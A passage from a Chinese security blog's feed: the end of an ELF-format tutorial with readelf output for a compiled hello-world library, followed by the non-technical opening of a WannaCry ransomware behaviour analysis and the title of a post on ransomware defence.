同名的本地符号可以存在于多个文件中，互不干扰</td></tr><tr><td>STB_GLOBAL(1)</td><td>全局符号对所有正在组合的目标文件都是可见的。 一个文件对全局符号的定义将满足另一个文件对同一全局符号的未定义引用</td></tr><tr><td>STB_WEAK(2)</td><td>弱符号类似于全局符号，但它们的定义具有较低的优先级</td></tr><tr><td>[STB_LOPROC(13), STB_HIPROC(15)]</td><td>预留位，用于特殊处理器的特定含义</td></tr></tbody></table></div><ul><li>TYPE：</li></ul><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>STT_NOTYPE(0)</td><td>符号的类型未指定</td></tr><tr><td>STT_OBJECT(1)</td><td>符号与数据对象相关联，例如变量、数组等</td></tr><tr><td>STT_FUNC(2)</td><td>符号与函数或其他可执行代码相关联</td></tr><tr><td>STT_SECTION(3)</td><td>该符号与一个节相关联。 这种类型的符号表条目主要用于重定位，通常具有<code>STB_LOCALBIND</code>属性</td></tr><tr><td>STT_FILE(4)</td><td>一个有<code>STB_LOCAL</code>的<code>BIND</code>属性的文件符号的节索引为<code>SHN_ABS</code>。并且如果存在其他<code>STB_LOCAL</code>属性的符号，则当前符号应该在其之前</td></tr><tr><td>[STT_LOPROC(13), STT_HIPROC(15)]</td><td>预留位，用于特殊处理器的特定含义</td></tr></tbody></table></div><ul><li>INFO：</li></ul><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>SHN_ABS</td><td>符号有一个绝对值，不会因为重定位而改变</td></tr><tr><td>SHN_COMMON</td><td>该符号标记尚未分配的公共块。 符号的值给出了对齐约束，类似于节的<code>sh_addralign</code>成员。 也就是说，链接编辑器将为符号分配存储空间，该地址是 <code>st_value</code>的倍数。 符号的大小表明需要多少字节</td></tr><tr><td>SHN_UNDEF</td><td>此节表索引表示该符号未定义。 当链接编辑器将此对象文件与另一个定义指定符号的文件组合时，此文件对符号的引用将链接到实际定义</td></tr></tbody></table></div><h1 id="4-ELF文件示例"><a href="#4-ELF文件示例" class="headerlink" title="4. ELF文件示例"></a>4. ELF文件示例</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hello.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello world!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将上面的<code>hello.c</code>分别编译为三种不同文件：</p><ul><li><code>gcc -g -c hello.c</code>：生成可重定位文件<code>hello.o</code>。</li><li><code>gcc -g -o hello hello.c</code>：生成可执行文件。</li><li><code>gcc -g -fPIC -o libhello.so -shared hello.c</code>：生成共享目标文件。</li></ul><img src="/posts/187bfa35/4.1.1.png" class="" title="编译ELF文件"><h2 id="4-1-共享目标文件"><a href="#4-1-共享目标文件" class="headerlink" title="4.1 共享目标文件"></a>4.1 共享目标文件</h2><h3 id="4-1-1-ELF文件头"><a href="#4-1-1-ELF文件头" class="headerlink" title="4.1.1 ELF文件头"></a>4.1.1 ELF文件头</h3><p>解析ELF文件头：<code>readelf -h [文件名]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ readelf -h libhello.so </span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              DYN (Shared object file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x0</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          14296 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         9</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         34</span><br><span class="line">  Section header string table index: 33                                  </span><br></pre></td></tr></table></figure><p>从上面的ELF文件头信息中能够看出：当前文件类型为64bit的共享库，小端存储，版本为1，机器架构为x86-64，程序头表项有9项，节头表项有34项。</p><h3 id="4-1-2-程序头表"><a href="#4-1-2-程序头表" class="headerlink" title="4.1.2 程序头表"></a>4.1.2 程序头表</h3><p>解析ELF程序头表：<code>readelf -l [文件名]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ readelf -l libhello.so</span><br><span class="line"></span><br><span class="line">Elf file type is DYN (Shared object file)</span><br><span class="line">Entry point 0x0</span><br><span class="line">There are 9 program headers, starting at offset 64</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset             VirtAddr           PhysAddr</span><br><span class="line">                 FileSiz            MemSiz              Flags  Align</span><br><span class="line">  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">                 0x0000000000000498 0x0000000000000498  R      0x1000</span><br><span class="line">  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000</span><br><span class="line">                 0x0000000000000139 0x0000000000000139  R E    0x1000</span><br><span class="line">  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000</span><br><span class="line">                 0x00000000000000b4 0x00000000000000b4  R      0x1000</span><br><span class="line">  LOAD           0x0000000000002e10 0x0000000000003e10 0x0000000000003e10</span><br><span class="line">                 0x0000000000000218 0x0000000000000220  RW     0x1000</span><br><span class="line">  DYNAMIC        0x0000000000002e20 0x0000000000003e20 0x0000000000003e20</span><br><span class="line">                 0x00000000000001c0 0x00000000000001c0  RW     0x8</span><br><span class="line">  NOTE           0x0000000000000238 0x0000000000000238 0x0000000000000238</span><br><span class="line">                 0x0000000000000024 0x0000000000000024  R      0x4</span><br><span class="line">  GNU_EH_FRAME   0x0000000000002010 0x0000000000002010 0x0000000000002010</span><br><span class="line">                 0x0000000000000024 0x0000000000000024  R      0x4</span><br><span class="line">  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">                 0x0000000000000000 0x0000000000000000  RW     0x10</span><br><span class="line">  GNU_RELRO      0x0000000000002e10 0x0000000000003e10 0x0000000000003e10</span><br><span class="line">                 0x00000000000001f0 0x00000000000001f0  R      0x1</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00     .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt </span><br><span class="line">   01     .init .plt .plt.got .text .fini </span><br><span class="line">   02     .rodata .eh_frame_hdr .eh_frame </span><br><span class="line">   03     .init_array .fini_array .dynamic .got .got.plt .data .bss </span><br><span class="line">   04     .dynamic </span><br><span class="line">   05     .note.gnu.build-id </span><br><span class="line">   06     .eh_frame_hdr </span><br><span class="line">   07     </span><br><span class="line">   08     .init_array .fini_array .dynamic .got </span><br></pre></td></tr></table></figure><p>从展示的程序头表可以看出上半部分的内容基本和程序头表项的每个字段基本对应。从下面的Segment Sections可以看出一个Segment是多个Section的集合。</p><h3 id="4-1-3-节头表"><a href="#4-1-3-节头表" class="headerlink" title="4.1.3 节头表"></a>4.1.3 节头表</h3><p>解析节头表：<code>readelf -S [文件名]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ readelf -S libhello.so</span><br><span class="line">There are 34 section headers, starting at offset 0x37d8:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .note.gnu.bu[...] NOTE             0000000000000238  00000238</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 2] .gnu.hash         GNU_HASH         0000000000000260  00000260</span><br><span class="line">       0000000000000024  0000000000000000   A       3     0     8</span><br><span class="line">  [ 3] .dynsym           DYNSYM           0000000000000288  00000288</span><br><span class="line">       00000000000000a8  0000000000000018   A       4     1     8</span><br><span class="line">  [ 4] .dynstr           STRTAB           0000000000000330  00000330</span><br><span class="line">       0000000000000075  0000000000000000   A       0     0     1</span><br><span class="line">  [ 5] .gnu.version      VERSYM           00000000000003a6  000003a6</span><br><span class="line">       000000000000000e  0000000000000002   A       3     0     2</span><br><span class="line">  [ 6] .gnu.version_r    VERNEED          00000000000003b8  000003b8</span><br><span class="line">       0000000000000020  0000000000000000   A       4     1     8</span><br><span class="line">  [ 7] .rela.dyn         RELA             00000000000003d8  000003d8</span><br><span class="line">       00000000000000a8  0000000000000018   A       3     0     8</span><br><span class="line">  [ 8] .rela.plt         RELA             0000000000000480  00000480</span><br><span class="line">       0000000000000018  0000000000000018  AI       3    21     8</span><br><span class="line">  [ 9] .init             PROGBITS         0000000000001000  00001000</span><br><span class="line">       0000000000000017  0000000000000000  AX       0     0     4</span><br><span class="line">  [10] .plt              PROGBITS         0000000000001020  00001020</span><br><span class="line">       0000000000000020  0000000000000010  AX       0     0     16</span><br><span class="line">  [11] .plt.got          PROGBITS         0000000000001040  00001040</span><br><span class="line">       0000000000000008  0000000000000008  AX       0     0     8</span><br><span class="line">  [12] .text             PROGBITS         0000000000001050  00001050</span><br><span class="line">       00000000000000de  0000000000000000  AX       0     0     16</span><br><span class="line">  [13] .fini             PROGBITS         0000000000001130  00001130</span><br><span class="line">       0000000000000009  0000000000000000  AX       0     0     4</span><br><span class="line">  [14] .rodata           PROGBITS         0000000000002000  00002000</span><br><span class="line">       000000000000000d  0000000000000000   A       0     0     1</span><br><span class="line">  [15] .eh_frame_hdr     PROGBITS         0000000000002010  00002010</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [16] .eh_frame         PROGBITS         0000000000002038  00002038</span><br><span class="line">       000000000000007c  0000000000000000   A       0     0     8</span><br><span class="line">  [17] .init_array       INIT_ARRAY       0000000000003e10  00002e10</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [18] .fini_array       FINI_ARRAY       0000000000003e18  00002e18</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [19] .dynamic          DYNAMIC          0000000000003e20  00002e20</span><br><span class="line">       00000000000001c0  0000000000000010  WA       4     0     8</span><br><span class="line">  [20] .got              PROGBITS         0000000000003fe0  00002fe0</span><br><span class="line">       0000000000000020  0000000000000008  WA       0     0     8</span><br><span class="line">  [21] .got.plt          PROGBITS         0000000000004000  00003000</span><br><span class="line">       0000000000000020  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .data             PROGBITS         0000000000004020  00003020</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     8</span><br><span class="line">  [23] .bss              NOBITS           0000000000004028  00003028</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     1</span><br><span class="line">  [24] .comment          PROGBITS         0000000000000000  00003028</span><br><span class="line">       000000000000001e  0000000000000001  MS       0     0     1</span><br><span class="line">  [25] .debug_aranges    PROGBITS         0000000000000000  00003046</span><br><span class="line">       0000000000000030  0000000000000000           0     0     1</span><br><span class="line">  [26] .debug_info       PROGBITS         0000000000000000  00003076</span><br><span class="line">       00000000000000b5  0000000000000000           0     0     1</span><br><span class="line">  [27] .debug_abbrev     PROGBITS         0000000000000000  0000312b</span><br><span class="line">       0000000000000064  0000000000000000           0     0     1</span><br><span class="line">  [28] .debug_line       PROGBITS         0000000000000000  0000318f</span><br><span class="line">       0000000000000052  0000000000000000           0     0     1</span><br><span class="line">  [29] .debug_str        PROGBITS         0000000000000000  000031e1</span><br><span class="line">       00000000000000a7  0000000000000001  MS       0     0     1</span><br><span class="line">  [30] .debug_line_str   PROGBITS         0000000000000000  00003288</span><br><span class="line">       000000000000001b  0000000000000001  MS       0     0     1</span><br><span class="line">  [31] .symtab           SYMTAB           0000000000000000  000032a8</span><br><span class="line">       0000000000000270  0000000000000018          32    20     8</span><br><span class="line">  [32] .strtab           STRTAB           0000000000000000  00003518</span><br><span class="line">       0000000000000178  0000000000000000           0     0     1</span><br><span class="line">  [33] .shstrtab         STRTAB           0000000000000000  00003690</span><br><span class="line">       0000000000000141  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure><p>从上面看出内容基本和程序头表项的每个字段基本对应。除了上面提到的特殊的节也有一些额外的节，比如<code>.got.plt</code>。</p><h3 id="4-1-4-符号表"><a href="#4-1-4-符号表" class="headerlink" title="4.1.4 符号表"></a>4.1.4 符号表</h3><p>解析符号表：<code>readelf -s [文件名]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ readelf -s libhello.so</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.dynsym&#x27; contains 7 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]</span><br><span class="line">     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)</span><br><span class="line">     3: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     4: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]</span><br><span class="line">     5: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND [...]@GLIBC_2.2.5 (2)</span><br><span class="line">     6: 0000000000001109    37 FUNC    GLOBAL DEFAULT   12 main</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 26 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">     2: 0000000000001050     0 FUNC    LOCAL  DEFAULT   12 deregister_tm_clones</span><br><span class="line">     3: 0000000000001080     0 FUNC    LOCAL  DEFAULT   12 register_tm_clones</span><br><span class="line">     4: 00000000000010c0     0 FUNC    LOCAL  DEFAULT   12 __do_global_dtors_aux</span><br><span class="line">     5: 0000000000004028     1 OBJECT  LOCAL  DEFAULT   23 completed.0</span><br><span class="line">     6: 0000000000003e18     0 OBJECT  LOCAL  DEFAULT   18 __do_global_dtor[...]</span><br><span class="line">     7: 0000000000001100     0 FUNC    LOCAL  DEFAULT   12 frame_dummy</span><br><span class="line">     8: 0000000000003e10     0 OBJECT  LOCAL  DEFAULT   17 __frame_dummy_in[...]</span><br><span class="line">     9: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS hello.c</span><br><span class="line">    10: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    11: 00000000000020b0     0 OBJECT  LOCAL  DEFAULT   16 __FRAME_END__</span><br><span class="line">    12: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS </span><br><span class="line">    13: 0000000000001130     0 FUNC    LOCAL  DEFAULT   13 _fini</span><br><span class="line">    14: 0000000000004020     0 OBJECT  LOCAL  DEFAULT   22 __dso_handle</span><br><span class="line">    15: 0000000000003e20     0 OBJECT  LOCAL  DEFAULT   19 _DYNAMIC</span><br><span class="line">    16: 0000000000002010     0 NOTYPE  LOCAL  DEFAULT   15 __GNU_EH_FRAME_HDR</span><br><span class="line">    17: 0000000000004028     0 OBJECT  LOCAL  DEFAULT   22 __TMC_END__</span><br><span class="line">    18: 0000000000004000     0 OBJECT  LOCAL  DEFAULT   21 _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    19: 0000000000001000     0 FUNC    LOCAL  DEFAULT    9 _init</span><br><span class="line">    20: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]</span><br><span class="line">    21: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5</span><br><span class="line">    22: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">    23: 0000000000001109    37 FUNC    GLOBAL DEFAULT   12 main</span><br><span class="line">    24: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]</span><br><span class="line">    25: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@G[...]</span><br></pre></td></tr></table></figure><p>可以看出符号表有两个，分别为<code>dynsym</code>和<code>symtab</code>，<code>symtab</code>中包含所有在程序中出现的符号以及一些库函数的符号，而<code>dynsym</code>中的符号是<code>symtab</code>中符号的子集，仅仅出现了外部可以看到的符号（比如静态函数<code>mult</code>的符号在<code>dynsym</code>就看不到）。这是因为<code>dynsym</code>中的符号只有在动态链接时也就是运行时才能被解析。</p><h1 id="5-解析ELF文件相关工具"><a href="#5-解析ELF文件相关工具" class="headerlink" title="5. 解析ELF文件相关工具"></a>5. 解析ELF文件相关工具</h1><h2 id="5-1-objdump"><a href="#5-1-objdump" class="headerlink" title="5.1 objdump"></a>5.1 objdump</h2><p>objdump 有点像快速查看之类的工具，就是以一种可阅读的格式让你更多地了解二进制文件可能带有的附加信息。对于想进一步了解系统的程序员，应该掌握这种工具，至少你可以自己写写shellcode了，或者看看人家给的 exploit 中的 shellcode 是什么东西。</p><p>Windows下使用objdump需要下载<a href="https://developer.android.google.cn/ndk/downloads/index.html">Android NDK</a>，将objdump所在路径添加到环境变量，就可以使用objdump了。Windows下的objdump工具名为llvm-objdump。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">llvm-objdump -S pwn1 &gt; Disassembly.txt//-S 尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数</span><br><span class="line">llvm-objdump -s pwn1 &gt; Section.txt//-s 显示指定section的完整内容</span><br></pre></td></tr></table></figure><h2 id="5-2-readelf"><a href="#5-2-readelf" class="headerlink" title="5.2 readelf"></a>5.2 readelf</h2><p>用法同4.1</p><p>Windows下的readelf也在Android NDK中，与objdump同一个目录。Windows下的objdump工具名为llvm-readelf。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9\Desktop&gt;llvm-readelf -h pwn1</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              EXEC (Executable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x401060</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          14680 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         11</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         29</span><br><span class="line">  Section header string table index: 28</span><br></pre></td></tr></table></figure><h2 id="5-3-010-Editor"><a href="#5-3-010-Editor" class="headerlink" title="5.3 010 Editor"></a>5.3 010 Editor</h2><p>在分析ELF文件格式时就用到了010 Editor，载入ELF模板分析ELF文件事半功倍。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Android是基于Linux开发的，所以了解ELF格式对学习Android逆向和Linux逆向是必不可少的。&lt;/p&gt;
&lt;p&gt;可执行与可链接格式 （Executable and Linkable Format，ELF），常被称为 ELF格式，是一种用于可执行文件、目标代码、共享库和核心转储（core dump）的标准文件格式，一般用于类Unix系统，比如Linux，Macox等。ELF 格式灵活性高、可扩展，并且跨平台。比如它支持不同的字节序和地址范围，所以它不会不兼容某一特别的 CPU 或指令架构。这也使得 ELF 格式能够被运行于众多不同平台的各种操作系统广泛采纳。&lt;/p&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>WannaCry病毒的行为机理分析</title>
    <link href="http://example.com/posts/d0c575b3.html"/>
    <id>http://example.com/posts/d0c575b3.html</id>
    <published>2022-07-14T11:34:12.668Z</published>
    <updated>2022-07-17T02:43:14.063Z</updated>
    
    <content type="html"><![CDATA[<p>上一篇文章是利用永恒之蓝漏洞上传WannaCry勒索病毒，所以这篇文章将详细讲解WannaCry勒索病毒的原理。</p><span id="more"></span><h1 id="1-WannaCry病毒分析"><a href="#1-WannaCry病毒分析" class="headerlink" title="1. WannaCry病毒分析"></a>1. WannaCry病毒分析</h1><p>分析方法主要有两种：静态分析和动态分析。</p><ul><li><p>静态分析以反汇编为主，通过分析勒索软件的代码了解其行为和各功能实现细节</p></li><li><p>动态分析主要有动态调试、行为分析、沙盒分析</p><p>动态调试主要配合静态分析进行，对静态分析进行辅助。</p><p>行为分析主要通过系统日志来观察勒索软件的行为，从而了解勒索软件行为。</p><p>沙盒分析作为目前自动化分析的主要手段，主要用来辅助手动分析，通过在沙盒中运行勒索软件，能够得到勒索软件的API调用、文件行为、网络行为等行为。</p></li></ul><p>首先来看安天分享的WannaCry流程图，其运行流程包括：</p><ul><li>主程序文件利用漏洞传播自身，运行WannaCry勒索程序</li><li>WannaCry勒索程序释放<code>tasksche.exe</code>，对磁盘文件进行加密勒索</li><li><code>@WanaDecryptor@.exe</code>显示勒索信息，解密示例文件</li></ul><img src="/posts/d0c575b3/1.1.1.png" class="" title="WannaCry病毒的行为分析">]]></content>
    
    
    <summary type="html">&lt;p&gt;上一篇文章是利用永恒之蓝漏洞上传WannaCry勒索病毒，所以这篇文章将详细讲解WannaCry勒索病毒的原理。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="样本分析" scheme="http://example.com/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>外部威胁防护和勒索病毒对抗</title>
    <link href="http://example.com/posts/11f48b75.html"/>
    <id>http://example.com/posts/11f48b75.html</id>
    <published>2022-07-13T05:46:20.002Z</published>
    <updated>2022-07-17T02:35:59.245Z</updated>
    
